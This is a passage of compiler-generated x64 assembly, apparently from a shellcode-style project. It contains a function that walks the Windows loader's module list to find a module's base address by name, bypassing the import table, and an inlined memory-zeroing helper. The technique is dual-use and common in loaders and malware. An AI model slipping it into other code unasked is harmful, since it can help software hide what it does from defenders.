	mov	QWORD PTR head$[rsp], rax
; Line 39
	mov	rax, QWORD PTR head$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR current$6[rsp], rax
	jmp	SHORT $LN4@get_module
$LN2@get_module:
	mov	rax, QWORD PTR current$6[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR current$6[rsp], rax
$LN4@get_module:
	mov	rax, QWORD PTR head$[rsp]
	cmp	QWORD PTR current$6[rsp], rax
	je	$LN3@get_module
; Line 40
	mov	rax, QWORD PTR current$6[rsp]
	sub	rax, 16
	mov	QWORD PTR entry$5[rsp], rax
; Line 41
	cmp	QWORD PTR entry$5[rsp], 0
	je	SHORT $LN9@get_module
	mov	rax, QWORD PTR entry$5[rsp]
	cmp	QWORD PTR [rax+48], 0
	jne	SHORT $LN8@get_module
$LN9@get_module:
	jmp	$LN3@get_module
$LN8@get_module:
; Line 43
	mov	rax, QWORD PTR entry$5[rsp]
	mov	rax, QWORD PTR [rax+96]
	mov	QWORD PTR curr_name$2[rsp], rax
; Line 44
	cmp	QWORD PTR curr_name$2[rsp], 0
	jne	SHORT $LN10@get_module
	jmp	SHORT $LN2@get_module
$LN10@get_module:
; Line 47
	mov	QWORD PTR i$1[rsp], 0
	jmp	SHORT $LN7@get_module
$LN5@get_module:
	mov	rax, QWORD PTR i$1[rsp]
	inc	rax
	mov	QWORD PTR i$1[rsp], rax
$LN7@get_module:
	mov	rax, QWORD PTR entry$5[rsp]
	movzx	eax, WORD PTR [rax+88]
	cmp	QWORD PTR i$1[rsp], rax
	jae	$LN6@get_module
; Line 49
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	je	SHORT $LN12@get_module
	mov	rax, QWORD PTR curr_name$2[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	jne	SHORT $LN11@get_module
$LN12@get_module:
; Line 50
	jmp	$LN6@get_module
$LN11@get_module:
; Line 53
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 90					; 0000005aH
	jg	SHORT $LN16@get_module
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 65					; 00000041H
	jl	SHORT $LN16@get_module
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	sub	eax, 65					; 00000041H
	add	eax, 97					; 00000061H
	mov	DWORD PTR tv137[rsp], eax
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	edx, WORD PTR tv137[rsp]
	mov	WORD PTR [rax+rcx*2], dx
	movzx	eax, WORD PTR tv137[rsp]
	mov	WORD PTR tv141[rsp], ax
	jmp	SHORT $LN17@get_module
$LN16@get_module:
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	mov	WORD PTR tv141[rsp], ax
$LN17@get_module:
	movzx	eax, WORD PTR tv141[rsp]
	mov	WORD PTR c1$3[rsp], ax
; Line 54
	mov	rax, QWORD PTR curr_name$2[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 90					; 0000005aH
	jg	SHORT $LN18@get_module
	mov	rax, QWORD PTR curr_name$2[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 65					; 00000041H
	jl	SHORT $LN18@get_module
	mov	rax, QWORD PTR curr_name$2[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	sub	eax, 65					; 00000041H
	add	eax, 97					; 00000061H
	mov	DWORD PTR tv156[rsp], eax
	mov	rax, QWORD PTR curr_name$2[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	edx, WORD PTR tv156[rsp]
	mov	WORD PTR [rax+rcx*2], dx
	movzx	eax, WORD PTR tv156[rsp]
	mov	WORD PTR tv160[rsp], ax
	jmp	SHORT $LN19@get_module
$LN18@get_module:
	mov	rax, QWORD PTR curr_name$2[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	mov	WORD PTR tv160[rsp], ax
$LN19@get_module:
	movzx	eax, WORD PTR tv160[rsp]
	mov	WORD PTR c2$4[rsp], ax
; Line 55
	movzx	eax, WORD PTR c1$3[rsp]
	movzx	ecx, WORD PTR c2$4[rsp]
	cmp	eax, ecx
	je	SHORT $LN13@get_module
	jmp	SHORT $LN6@get_module
$LN13@get_module:
; Line 56
	jmp	$LN5@get_module
$LN6@get_module:
; Line 58
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	jne	SHORT $LN14@get_module
	mov	rax, QWORD PTR curr_name$2[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	jne	SHORT $LN14@get_module
; Line 59
	mov	rax, QWORD PTR entry$5[rsp]
	mov	rax, QWORD PTR [rax+48]
	jmp	SHORT $LN1@get_module
$LN14@get_module:
; Line 61
	jmp	$LN2@get_module
$LN3@get_module:
; Line 63
	xor	eax, eax
$LN1@get_module:
; Line 64
	add	rsp, 88					; 00000058H
	ret	0
?get_module_by_name@@YAPEAXPEA_W@Z ENDP			; get_module_by_name
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT RtlSecureZeroMemory
_TEXT	SEGMENT
vptr$ = 0
ptr$ = 32
cnt$ = 40
RtlSecureZeroMemory PROC				; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.22621.0\um\winnt.h
; Line 21716
$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rdi
	sub	rsp, 16
; Line 21717
	mov	rax, QWORD PTR ptr$[rsp]
	mov	QWORD PTR vptr$[rsp], rax
; Line 21721
	mov	rdi, QWORD PTR vptr$[rsp]
	xor	eax, eax
	mov	rcx, QWORD PTR cnt$[rsp]
	rep stosb
; Line 21743
	mov	rax, QWORD PTR ptr$[rsp]
; Line 21744
	add	rsp, 16
	pop	rdi
	ret	0
RtlSecureZeroMemory ENDP
_TEXT	ENDS
END